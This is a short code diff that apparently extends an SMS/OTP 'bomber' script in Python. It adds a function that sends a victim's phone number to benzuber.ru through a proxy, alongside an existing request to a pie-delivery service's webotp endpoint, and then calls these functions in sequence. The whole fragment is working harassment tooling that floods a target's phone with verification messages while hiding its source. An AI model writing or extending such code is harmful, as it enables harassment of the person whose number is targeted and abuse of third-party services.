@@ -87,8 +87,14 @@ def pirogiNomerOdin():
     pir=requests.post("https://api.01.hungrygator.ru/web/auth/webotp",headers=pirHeaders,proxies=proxy,json={"userLogin":pirPhone,"fu":"bar"})
     print(pir.status_code,"Пироги №1")
 
+def benZuber():
+    benHeaders=headers
+    benHeaders.update({"Host":"benzuber.ru","Referer":"https://benzuber.ru/"})
+    benPhone="7"+phone
+    ben=requests.get("https://benzuber.ru/business/commit/?phone=",headers=benHeaders,proxies=proxy,params={"phone":benPhone})
+    print(ben.status_code, "БенЗубер")
 
-
+benZuber()
 pirogiNomerOdin()
 okey()
 pyaterka()
